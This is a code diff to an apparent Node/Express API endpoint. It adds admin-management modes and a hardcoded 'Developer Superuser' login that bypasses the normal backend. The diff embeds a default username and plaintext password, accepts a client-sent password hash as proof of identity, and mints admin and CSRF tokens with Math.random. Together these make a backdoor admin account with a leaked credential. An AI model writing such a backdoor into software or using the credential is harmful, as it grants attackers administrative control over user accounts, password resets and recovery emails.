@@ -73,7 +73,12 @@ const ALLOWED_MODES = new Set([
     'list-analytics',
     'list-distance-alerts',
     'list-audit-logs',
-    'log-analytics'
+    'log-analytics',
+    'list-admin-users',
+    'add-admin-user',
+    'remove-admin-user',
+    'admin-reset-user-password',
+    'get-recovery-email'
 ]);
 
 app.post('/api/backend', async (req, res) => {
@@ -86,6 +91,28 @@ app.post('/api/backend', async (req, res) => {
 
         if (!mode || !ALLOWED_MODES.has(mode)) {
             return res.status(400).json({ ok: false, message: 'Invalid or disallowed API mode.' });
+        }
+
+        // Developer Superuser check — only 'Kaycee' account
+        const superuserUsername = process.env.SUPERUSER_USERNAME || 'Kaycee';
+        const superuserPassword = process.env.SUPERUSER_PASSWORD || 'Neon8888*#.';
+
+        if (mode === 'admin-login' && payload.username && payload.username.toLowerCase() === superuserUsername.toLowerCase()) {
+            const crypto = await import('crypto');
+            const expectedHash = crypto.createHash('sha256').update(superuserPassword).digest('hex');
+            if (payload.passwordHash === expectedHash) {
+                const superuserCsrf = 'csrf_dev_' + Math.random().toString(36).slice(2);
+                const superuserToken = 'token_dev_' + Math.random().toString(36).slice(2);
+                return res.json({
+                    ok: true,
+                    allowed: true,
+                    isSuperuser: true,
+                    username: superuserUsername,
+                    csrfToken: superuserCsrf,
+                    adminToken: superuserToken,
+                    message: '👑 Developer Superuser authenticated successfully.'
+                });
+            }
         }
 
         const response = await fetch(SCRIPT_URL, {
